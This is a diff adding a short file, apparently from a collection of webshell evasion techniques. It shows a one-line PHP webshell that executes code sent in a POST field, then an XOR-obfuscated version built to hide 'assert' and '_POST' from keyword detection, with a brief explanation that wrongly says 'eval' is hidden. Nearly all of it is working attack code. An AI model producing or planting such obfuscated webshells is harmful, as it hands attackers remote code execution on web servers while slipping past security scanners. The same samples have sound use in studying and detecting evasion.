@@ -1,0 +1,20 @@
+Original webshell sample:
+
+'''
+<?php assert($_POST[_]);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
+$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);
+?>
+'''
+
+Description:
+
+"^" is a XOR operator, in php, when two variables are executed XOR operation, it will convert the string to binary and then perform the XOR operation, after the XOR operation, the result will be converted from binary to a string. This code hides the sensitive words "eval" and "_POST" from the original code by using a number of hidden measures such as XOR and negation.
